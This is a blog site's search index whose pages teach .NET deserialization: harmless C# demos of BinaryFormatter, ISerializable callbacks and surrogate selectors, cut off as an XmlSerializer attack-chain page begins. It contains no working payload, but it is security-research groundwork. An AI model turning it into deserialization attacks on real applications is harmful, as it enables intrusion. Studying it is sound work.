{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"About \u535a\u5ba2\uff0c\u4e0d\u5b9a\u671f\u66f4\u65b0\uff0c\u6bd4\u8f83\u6742\u4e71\uff0c\u5bb6\u4eba\u4eec\u4e0d\u8981\u55b7\u6211\u3002 \u7b14\u8bb0\u6bd4\u8f83\u6742\u4e71\uff0c\u6709\u5f88\u5927\u90e8\u5206\u53e4\u65e9\u7684\u7b14\u8bb0\u6ca1\u6709\u76ee\u5f55\uff0c\u5404\u4f4d\u89c1\u8c05\u3002= = name:ConsT27 \u5c31\u804c\u67d0\u7532\u65b9\u7ea2\u961f\u3002 WX\uff1aconst27\uff0c\u6b22\u8fce\u5404\u4f4d\u5927\u4f6c\u4ea4\u4e2a\u670b\u53cb\u5440\uff5e","title":"About"},{"location":"#about","text":"\u535a\u5ba2\uff0c\u4e0d\u5b9a\u671f\u66f4\u65b0\uff0c\u6bd4\u8f83\u6742\u4e71\uff0c\u5bb6\u4eba\u4eec\u4e0d\u8981\u55b7\u6211\u3002 \u7b14\u8bb0\u6bd4\u8f83\u6742\u4e71\uff0c\u6709\u5f88\u5927\u90e8\u5206\u53e4\u65e9\u7684\u7b14\u8bb0\u6ca1\u6709\u76ee\u5f55\uff0c\u5404\u4f4d\u89c1\u8c05\u3002= = name:ConsT27 \u5c31\u804c\u67d0\u7532\u65b9\u7ea2\u961f\u3002 WX\uff1aconst27\uff0c\u6b22\u8fce\u5404\u4f4d\u5927\u4f6c\u4ea4\u4e2a\u670b\u53cb\u5440\uff5e","title":"About"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","text":"\u4ee3\u7801\u5ba1\u8ba1 PHP JAVA Dotnet \u81ea\u52a8\u5316\u5ba1\u8ba1","title":"\u4ee3\u7801\u5ba1\u8ba1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#_1","text":"PHP JAVA Dotnet \u81ea\u52a8\u5316\u5ba1\u8ba1","title":"\u4ee3\u7801\u5ba1\u8ba1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/Dotnet/","text":"Dotnet Dotnet\u53cd\u5e8f\u5217\u5316\u5165\u95e8\u5404\u6982\u5ff5 \u57fa\u7840\u94fe-XmlSerializer\u94fe","title":"Dotnet"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/Dotnet/#dotnet","text":"Dotnet\u53cd\u5e8f\u5217\u5316\u5165\u95e8\u5404\u6982\u5ff5 \u57fa\u7840\u94fe-XmlSerializer\u94fe","title":"Dotnet"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/","text":"Dotnet\u53cd\u5e8f\u5217\u5316\u5165\u95e8\u5404\u6982\u5ff5 \u76ee\u5f55 Dotnet\u53cd\u5e8f\u5217\u5316 Formatter BinaryFormatter\u5e8f\u5217\u5316\u7684\u751f\u547d\u5468\u671f\u548c\u4e8b\u4ef6 ISerializable \u4ee3\u7406\u9009\u62e9\u5668 Ref: Dotnet\u5728\u56fd\u5185\u4e0d\u7b97\u591a\uff0c\u56fd\u5185java\u5b89\u5168\u504f\u591a\u4e00\u70b9\u3002 \u4f46\u662f\u56fd\u5916Dotnet\u5f88\u706b\uff0c\u5f88\u591a\u516c\u53f8\u90fd\u662f\u7eaf\u5fae\u8f6f\u6280\u672f\u6808\u7684\uff0c\u6240\u4ee5\u7814\u7a76Dotnet\u8fd8\u662f\u6709\u5fc5\u8981\u7684\u3002 \u672c\u6587\u9ed8\u8ba4\u8bfb\u8005\u6709c#\u8bed\u6cd5\u57fa\u7840 Dotnet\u53cd\u5e8f\u5217\u5316 \u672c\u6587\u5f88\u5927\u7a0b\u5ea6\u53c2\u8003\u4e86Y4er\u5e08\u5085\u7684\u6587\u7ae0\uff1a https://github.com/Y4er/dotnet-deserialization/blob/main/dotnet-serialize-101.md \u672c\u5c0f\u8282\u5f88\u5927\u7a0b\u5ea6\u53c2\u8003\u4e86Y4er\u5e08\u5085\u7684 \u5148\u6765\u4e00\u4e2a\u6700\u57fa\u672c\u7684Dotnet\u53cd\u5e8f\u5217\u5316demo\uff0c\u4e86\u89e3\u4e00\u4e0bSerializable\u3001NonSerialized\u7279\u6027\u4ee5\u53ca\u5e8f\u5217\u5316\u3001\u53cd\u5e8f\u5217\u5316\u4f1a\u7528\u5230\u7684\u51fd\u6570\u7b49\u3002 using System; using System.Runtime.Serialization.Formatters.Binary; namespace ConsoleAppi1; [Serializable] //\u4e00\u4e2a\u9700\u8981\u88ab\u5e8f\u5217\u5316\u7684\u7c7b\u9700\u8981\u52a0\u4e0aSerializable\u7279\u6027 public class Person { public int age=10; [NonSerialized]public String name=\"tom\"; //NonSerialized\u7279\u6027\u7528\u4e8e\u6807\u8bc6\u4e0d\u9700\u8981\u88ab\u5e8f\u5217\u5316\u7684\u5c5e\u6027 public String sex = \"Male\"; } public class MyObject { static void Main(string[] args) { Person p1 = new Person(); FileStream fstream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); BinaryFormatter binFormatterS = new BinaryFormatter(); binFormatterS.Serialize(fstream,p1); BinaryFormatter binFormatterD = new BinaryFormatter(); fstream.Position = 0; //\u4e0d\u52a0\u8fd9\u4e2a\u53ef\u80fd\u4f1a\u62a5\u9519 Person p2 = (Person)binFormatterD.Deserialize(fstream); Console.WriteLine(\"age:\"+p2.age); Console.WriteLine(\"name:\"+p2.name); Console.WriteLine(\"sex:\"+p2.sex); } } \u67e5\u770b\u5e8f\u5217\u5316\u7684\u6570\u636e\uff0c\u53d1\u73b0\u91c7\u75280001 0000\u5f00\u5934 Formatter Formatter\u7528\u4e8e\u8bbe\u7f6e\u5e8f\u5217\u5316\u7684\u683c\u5f0f\uff0c\u5982\u6211\u4eec\u4e0a\u9762\u7528\u5230\u4e86BinaryFormatter \u8fdb\u884c\u4e8c\u8fdb\u5236\u5e8f\u5217\u5316\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u5f88\u591aFormatter \u5982\uff1a SoapFormatter \u7528\u4e8e\u5e8f\u5217\u5316soap\u683c\u5f0f LosFormatter \u7528\u4e8e\u5e8f\u5217\u5316 Web \u7a97\u4f53\u9875\u7684\u89c6\u56fe\u72b6\u6001 XmlSerializer \u7528\u4e8e\u751f\u6210XML \u7b49 \u6240\u6709Formatter\u90fd\u6700\u7ec8\u7ee7\u627f\u81eaIFormatter\u63a5\u53e3\uff0c\u6211\u4eec\u770b\u770b\u8fd9\u4e2a\u63a5\u53e3 \u53ef\u4ee5\u53d1\u73b0\u5b9a\u4e49\u4e86\u5e8f\u5217\u5316\u3001\u53cd\u5e8f\u5217\u5316\u65b9\u6cd5\u4ee5\u53ca\u4e09\u4e2a\u5c5e\u6027\uff0c\u901a\u8fc7\u8fd9\u4e09\u4e2a\u5c5e\u6027\u53ef\u4ee5\u63a7\u5236\u5e8f\u5217\u5316\u3001\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u3002\u6211\u4eec\u91cd\u70b9\u5173\u6ce8SurrogateSelector\u5c5e\u6027\u3002 \u7c7b \u5b57\u6bb5\u540d \u542b\u4e49\u7528\u9014 ISurrogateSelector SurrogateSelector \u5e8f\u5217\u5316\u4ee3\u7406\u9009\u62e9\u5668 \u63a5\u7ba1formatter\u7684\u5e8f\u5217\u5316\u6216\u53cd\u5e8f\u5217\u5316\u5904\u7406 SerializationBinder Binder \u7528\u4e8e\u63a7\u5236\u5728\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u671f\u95f4\u4f7f\u7528\u7684\u5b9e\u9645\u7c7b\u578b StreamingContext Context \u5e8f\u5217\u5316\u6d41\u4e0a\u4e0b\u6587 \u5176\u4e2dstates\u5b57\u6bb5\u5305\u542b\u4e86\u5e8f\u5217\u5316\u7684\u6765\u6e90\u548c\u76ee\u7684\u5730 BinaryFormatter\u5e8f\u5217\u5316\u7684\u751f\u547d\u5468\u671f\u548c\u4e8b\u4ef6 ISerializable \u6211\u4eec\u5148\u6765\u770b\u770b\u5b9e\u73b0ISerializable \u63a5\u53e3\u7684\u7c7b \u5e8f\u5217\u5316\u3001\u53cd\u5e8f\u5217\u5316\u8c03\u7528\u6d41\u7a0b using System; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Binary; using System.Security.Permissions; namespace ConsoleAppi1; [Serializable] public class Person:ISerializable { public Person() { } //\u5fc5\u987b\u91cd\u8f7d\u4e00\u4e2a\u5982\u4e0b\u53c2\u6570\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u4e0d\u91cd\u8f7d\u7684\u8bdd\u4f1a\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u62a5\u9519 protected Person(SerializationInfo info, StreamingContext context) { Console.WriteLine(\"Constructor Begin!\"); } public void GetObjectData(SerializationInfo info, StreamingContext context) { Console.WriteLine(\"GetObjectData\"); } [OnDeserializing] private void TestOnDeserializing(StreamingContext sc) { Console.WriteLine(\"TestOnDeserializing\"); } [OnDeserialized] private void TestOnDeserialized(StreamingContext sc) { Console.WriteLine(\"TestOnDeserialized\"); } [OnSerializing] private void TestOnSerializing(StreamingContext sc) { Console.WriteLine(\"TestOnSerializing\"); } [OnSerialized] private void TestOnSerialized(StreamingContext sc) { Console.WriteLine(\"TestOnSerialized\"); } } public class MyObject { static void Main(string[] args) { Person p1 = new Person(); FileStream fstream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); BinaryFormatter binFormatterS = new BinaryFormatter(); binFormatterS.Serialize(fstream,p1); BinaryFormatter binFormatterD = new BinaryFormatter(); fstream.Position = 0; binFormatterD.Deserialize(fstream); } } \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u5b9e\u73b0\u4e86ISerializable\u63a5\u53e3\uff0c\u90a3\u4e48\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b\u5219\u4e3a\uff1a \u5e8f\u5217\u5316\u524d\uff1a\u8c03\u7528OnSerializing \u7279\u6027\u7684\u65b9\u6cd5 \u5e8f\u5217\u5316\u4e2d\uff1a \u8c03\u7528GetObjectData \u65b9\u6cd5 \u5e8f\u5217\u5316\u540e\uff1a\u8c03\u7528OnSerialized\u7279\u6027\u7684\u65b9\u6cd5 \u53cd\u5e8f\u5217\u5316\u524d\uff1a\u8c03\u7528OnDeserializing\u7279\u6027\u7684\u65b9\u6cd5 \u53cd\u5e8f\u5217\u5316\u4e2d\uff1a\u8c03\u7528\u6709\u7279\u5b9a\u53c2\u6570\u7684\u6784\u9020\u65b9\u6cd5 \u53cd\u5e8f\u5217\u5316\u540e\uff1a\u8c03\u7528OnDeserialized\u7279\u6027\u7684\u65b9\u6cd5 \u4ee3\u7406\u9009\u62e9\u5668 \u518d\u6765\u770b\u770b\u5b9e\u73b0\u4ee3\u7406\u9009\u62e9\u5668\u7684\u7c7b\u7684\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b using System; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Binary; using System.Security.Permissions; namespace ConsoleAppi1; [Serializable] public class Person:ISerializable { public Person() { } public Person(SerializationInfo info, StreamingContext context) { Console.WriteLine(\"Constructor Begin!\"); } public void GetObjectData(SerializationInfo info, StreamingContext context) { Console.WriteLine(\"GetObjectData\"); } [OnDeserializing] private void TestOnDeserializing(StreamingContext sc) { Console.WriteLine(\"TestOnDeserializing\"); } [OnDeserialized] private void TestOnDeserialized(StreamingContext sc) { Console.WriteLine(\"TestOnDeserialized\"); } [OnSerializing] private void TestOnSerializing(StreamingContext sc) { Console.WriteLine(\"TestOnSerializing\"); } [OnSerialized] private void TestOnSerialized(StreamingContext sc) { Console.WriteLine(\"TestOnSerialized\"); } } //\u5b9a\u4e49\u4ee3\u7406\u9009\u62e9\u5668\uff0c\u9700\u8981\u7ee7\u627f\u81eaISerializationSurrogate\uff0c\u5e76\u5b9e\u73b0GetObjectData\uff0cSetObjectData public class MySerializationSurrogate : ISerializationSurrogate { public void GetObjectData(object obj, SerializationInfo info, StreamingContext context) { Console.WriteLine(\"GetObjectData of ISerializationSurrogate\"); } public object SetObjectData(object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector) { Console.WriteLine(\"SetObjectData of ISerializationSurrogate\"); return 1; } } public class MyObject { static void Main(string[] args) { Person p1 = new Person(); FileStream fstream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); BinaryFormatter binFormatter = new BinaryFormatter(); //\u8bbe\u7f6e\u4ee3\u7406\u9009\u62e9\u5668 SurrogateSelector ss = new SurrogateSelector(); ss.AddSurrogate(typeof(Person), binFormatter.Context, new MySerializationSurrogate()); binFormatter.SurrogateSelector = ss; binFormatter.Serialize(fstream,p1); fstream.Position = 0; binFormatter.Deserialize(fstream); } } Ref: https://github.com/Y4er/dotnet-deserialization","title":"Dotnet\u53cd\u5e8f\u5217\u5316\u5165\u95e8\u5404\u6982\u5ff5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/#dotnet","text":"","title":"Dotnet\u53cd\u5e8f\u5217\u5316\u5165\u95e8\u5404\u6982\u5ff5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/#_1","text":"Dotnet\u53cd\u5e8f\u5217\u5316 Formatter BinaryFormatter\u5e8f\u5217\u5316\u7684\u751f\u547d\u5468\u671f\u548c\u4e8b\u4ef6 ISerializable \u4ee3\u7406\u9009\u62e9\u5668 Ref: Dotnet\u5728\u56fd\u5185\u4e0d\u7b97\u591a\uff0c\u56fd\u5185java\u5b89\u5168\u504f\u591a\u4e00\u70b9\u3002 \u4f46\u662f\u56fd\u5916Dotnet\u5f88\u706b\uff0c\u5f88\u591a\u516c\u53f8\u90fd\u662f\u7eaf\u5fae\u8f6f\u6280\u672f\u6808\u7684\uff0c\u6240\u4ee5\u7814\u7a76Dotnet\u8fd8\u662f\u6709\u5fc5\u8981\u7684\u3002 \u672c\u6587\u9ed8\u8ba4\u8bfb\u8005\u6709c#\u8bed\u6cd5\u57fa\u7840","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/#dotnet_1","text":"\u672c\u6587\u5f88\u5927\u7a0b\u5ea6\u53c2\u8003\u4e86Y4er\u5e08\u5085\u7684\u6587\u7ae0\uff1a https://github.com/Y4er/dotnet-deserialization/blob/main/dotnet-serialize-101.md \u672c\u5c0f\u8282\u5f88\u5927\u7a0b\u5ea6\u53c2\u8003\u4e86Y4er\u5e08\u5085\u7684 \u5148\u6765\u4e00\u4e2a\u6700\u57fa\u672c\u7684Dotnet\u53cd\u5e8f\u5217\u5316demo\uff0c\u4e86\u89e3\u4e00\u4e0bSerializable\u3001NonSerialized\u7279\u6027\u4ee5\u53ca\u5e8f\u5217\u5316\u3001\u53cd\u5e8f\u5217\u5316\u4f1a\u7528\u5230\u7684\u51fd\u6570\u7b49\u3002 using System; using System.Runtime.Serialization.Formatters.Binary; namespace ConsoleAppi1; [Serializable] //\u4e00\u4e2a\u9700\u8981\u88ab\u5e8f\u5217\u5316\u7684\u7c7b\u9700\u8981\u52a0\u4e0aSerializable\u7279\u6027 public class Person { public int age=10; [NonSerialized]public String name=\"tom\"; //NonSerialized\u7279\u6027\u7528\u4e8e\u6807\u8bc6\u4e0d\u9700\u8981\u88ab\u5e8f\u5217\u5316\u7684\u5c5e\u6027 public String sex = \"Male\"; } public class MyObject { static void Main(string[] args) { Person p1 = new Person(); FileStream fstream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); BinaryFormatter binFormatterS = new BinaryFormatter(); binFormatterS.Serialize(fstream,p1); BinaryFormatter binFormatterD = new BinaryFormatter(); fstream.Position = 0; //\u4e0d\u52a0\u8fd9\u4e2a\u53ef\u80fd\u4f1a\u62a5\u9519 Person p2 = (Person)binFormatterD.Deserialize(fstream); Console.WriteLine(\"age:\"+p2.age); Console.WriteLine(\"name:\"+p2.name); Console.WriteLine(\"sex:\"+p2.sex); } } \u67e5\u770b\u5e8f\u5217\u5316\u7684\u6570\u636e\uff0c\u53d1\u73b0\u91c7\u75280001 0000\u5f00\u5934","title":"Dotnet\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/#formatter","text":"Formatter\u7528\u4e8e\u8bbe\u7f6e\u5e8f\u5217\u5316\u7684\u683c\u5f0f\uff0c\u5982\u6211\u4eec\u4e0a\u9762\u7528\u5230\u4e86BinaryFormatter \u8fdb\u884c\u4e8c\u8fdb\u5236\u5e8f\u5217\u5316\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u5f88\u591aFormatter \u5982\uff1a SoapFormatter \u7528\u4e8e\u5e8f\u5217\u5316soap\u683c\u5f0f LosFormatter \u7528\u4e8e\u5e8f\u5217\u5316 Web \u7a97\u4f53\u9875\u7684\u89c6\u56fe\u72b6\u6001 XmlSerializer \u7528\u4e8e\u751f\u6210XML \u7b49 \u6240\u6709Formatter\u90fd\u6700\u7ec8\u7ee7\u627f\u81eaIFormatter\u63a5\u53e3\uff0c\u6211\u4eec\u770b\u770b\u8fd9\u4e2a\u63a5\u53e3 \u53ef\u4ee5\u53d1\u73b0\u5b9a\u4e49\u4e86\u5e8f\u5217\u5316\u3001\u53cd\u5e8f\u5217\u5316\u65b9\u6cd5\u4ee5\u53ca\u4e09\u4e2a\u5c5e\u6027\uff0c\u901a\u8fc7\u8fd9\u4e09\u4e2a\u5c5e\u6027\u53ef\u4ee5\u63a7\u5236\u5e8f\u5217\u5316\u3001\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u3002\u6211\u4eec\u91cd\u70b9\u5173\u6ce8SurrogateSelector\u5c5e\u6027\u3002 \u7c7b \u5b57\u6bb5\u540d \u542b\u4e49\u7528\u9014 ISurrogateSelector SurrogateSelector \u5e8f\u5217\u5316\u4ee3\u7406\u9009\u62e9\u5668 \u63a5\u7ba1formatter\u7684\u5e8f\u5217\u5316\u6216\u53cd\u5e8f\u5217\u5316\u5904\u7406 SerializationBinder Binder \u7528\u4e8e\u63a7\u5236\u5728\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u671f\u95f4\u4f7f\u7528\u7684\u5b9e\u9645\u7c7b\u578b StreamingContext Context \u5e8f\u5217\u5316\u6d41\u4e0a\u4e0b\u6587 \u5176\u4e2dstates\u5b57\u6bb5\u5305\u542b\u4e86\u5e8f\u5217\u5316\u7684\u6765\u6e90\u548c\u76ee\u7684\u5730","title":"Formatter"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/#binaryformatter","text":"","title":"BinaryFormatter\u5e8f\u5217\u5316\u7684\u751f\u547d\u5468\u671f\u548c\u4e8b\u4ef6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/#iserializable","text":"\u6211\u4eec\u5148\u6765\u770b\u770b\u5b9e\u73b0ISerializable \u63a5\u53e3\u7684\u7c7b \u5e8f\u5217\u5316\u3001\u53cd\u5e8f\u5217\u5316\u8c03\u7528\u6d41\u7a0b using System; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Binary; using System.Security.Permissions; namespace ConsoleAppi1; [Serializable] public class Person:ISerializable { public Person() { } //\u5fc5\u987b\u91cd\u8f7d\u4e00\u4e2a\u5982\u4e0b\u53c2\u6570\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u4e0d\u91cd\u8f7d\u7684\u8bdd\u4f1a\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u62a5\u9519 protected Person(SerializationInfo info, StreamingContext context) { Console.WriteLine(\"Constructor Begin!\"); } public void GetObjectData(SerializationInfo info, StreamingContext context) { Console.WriteLine(\"GetObjectData\"); } [OnDeserializing] private void TestOnDeserializing(StreamingContext sc) { Console.WriteLine(\"TestOnDeserializing\"); } [OnDeserialized] private void TestOnDeserialized(StreamingContext sc) { Console.WriteLine(\"TestOnDeserialized\"); } [OnSerializing] private void TestOnSerializing(StreamingContext sc) { Console.WriteLine(\"TestOnSerializing\"); } [OnSerialized] private void TestOnSerialized(StreamingContext sc) { Console.WriteLine(\"TestOnSerialized\"); } } public class MyObject { static void Main(string[] args) { Person p1 = new Person(); FileStream fstream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); BinaryFormatter binFormatterS = new BinaryFormatter(); binFormatterS.Serialize(fstream,p1); BinaryFormatter binFormatterD = new BinaryFormatter(); fstream.Position = 0; binFormatterD.Deserialize(fstream); } } \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u5b9e\u73b0\u4e86ISerializable\u63a5\u53e3\uff0c\u90a3\u4e48\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b\u5219\u4e3a\uff1a \u5e8f\u5217\u5316\u524d\uff1a\u8c03\u7528OnSerializing \u7279\u6027\u7684\u65b9\u6cd5 \u5e8f\u5217\u5316\u4e2d\uff1a \u8c03\u7528GetObjectData \u65b9\u6cd5 \u5e8f\u5217\u5316\u540e\uff1a\u8c03\u7528OnSerialized\u7279\u6027\u7684\u65b9\u6cd5 \u53cd\u5e8f\u5217\u5316\u524d\uff1a\u8c03\u7528OnDeserializing\u7279\u6027\u7684\u65b9\u6cd5 \u53cd\u5e8f\u5217\u5316\u4e2d\uff1a\u8c03\u7528\u6709\u7279\u5b9a\u53c2\u6570\u7684\u6784\u9020\u65b9\u6cd5 \u53cd\u5e8f\u5217\u5316\u540e\uff1a\u8c03\u7528OnDeserialized\u7279\u6027\u7684\u65b9\u6cd5","title":"ISerializable&#x20;"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/#_2","text":"\u518d\u6765\u770b\u770b\u5b9e\u73b0\u4ee3\u7406\u9009\u62e9\u5668\u7684\u7c7b\u7684\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b using System; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Binary; using System.Security.Permissions; namespace ConsoleAppi1; [Serializable] public class Person:ISerializable { public Person() { } public Person(SerializationInfo info, StreamingContext context) { Console.WriteLine(\"Constructor Begin!\"); } public void GetObjectData(SerializationInfo info, StreamingContext context) { Console.WriteLine(\"GetObjectData\"); } [OnDeserializing] private void TestOnDeserializing(StreamingContext sc) { Console.WriteLine(\"TestOnDeserializing\"); } [OnDeserialized] private void TestOnDeserialized(StreamingContext sc) { Console.WriteLine(\"TestOnDeserialized\"); } [OnSerializing] private void TestOnSerializing(StreamingContext sc) { Console.WriteLine(\"TestOnSerializing\"); } [OnSerialized] private void TestOnSerialized(StreamingContext sc) { Console.WriteLine(\"TestOnSerialized\"); } } //\u5b9a\u4e49\u4ee3\u7406\u9009\u62e9\u5668\uff0c\u9700\u8981\u7ee7\u627f\u81eaISerializationSurrogate\uff0c\u5e76\u5b9e\u73b0GetObjectData\uff0cSetObjectData public class MySerializationSurrogate : ISerializationSurrogate { public void GetObjectData(object obj, SerializationInfo info, StreamingContext context) { Console.WriteLine(\"GetObjectData of ISerializationSurrogate\"); } public object SetObjectData(object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector) { Console.WriteLine(\"SetObjectData of ISerializationSurrogate\"); return 1; } } public class MyObject { static void Main(string[] args) { Person p1 = new Person(); FileStream fstream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); BinaryFormatter binFormatter = new BinaryFormatter(); //\u8bbe\u7f6e\u4ee3\u7406\u9009\u62e9\u5668 SurrogateSelector ss = new SurrogateSelector(); ss.AddSurrogate(typeof(Person), binFormatter.Context, new MySerializationSurrogate()); binFormatter.SurrogateSelector = ss; binFormatter.Serialize(fstream,p1); fstream.Position = 0; binFormatter.Deserialize(fstream); } }","title":"\u4ee3\u7406\u9009\u62e9\u5668"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/#ref","text":"https://github.com/Y4er/dotnet-deserialization","title":"Ref:"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/","text":"\u57fa\u7840\u94fe-XmlSerializer\u94fe \u76ee\u5f55 XmlSerializer\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316 \u653b\u51fb\u94fe ObjectDataProvider ResourceDictionary Ref: XmlSerializer\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316 \u6765\u4e2ademo \u6211\u4eec\u628a\u8981\u5e8f\u5217\u5316\u7684\u7c7b\u7528[XmlRoot]\uff0c[XmlAttribute]\uff0c[XmlElement]\u7279\u6027\u5206\u522b\u6307\u5b9a\u6839\u8282\u70b9\uff0c\u8282\u70b9\u5c5e\u6027\uff0c\u8282\u70b9\u5143\u7d20\u3002 \u7136\u540e\u7528XmlSerializer \u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316 using System; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Binary; using System.Security.Permissions; using System.Xml.Serialization; namespace ConsoleAppi1; [XmlRoot] public class Person { [XmlAttribute] public string name { get; set; } [XmlElement] public int age { get; set; } [XmlElement] public string sex { get; set; } } public class MyObject { static void Main(string[] args) { Person p1 = new Person(); p1.age = 20; p1.name = \"tom\"; p1.sex = \"male\"; FileStream fstream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); //XmlSerializer xmlSerializer = new XmlSerializer(typeof(Person)); //XmlSerializer xmlSerializer = new XmlSerializer(p1.GetType()); XmlSerializer xmlSerializer = new 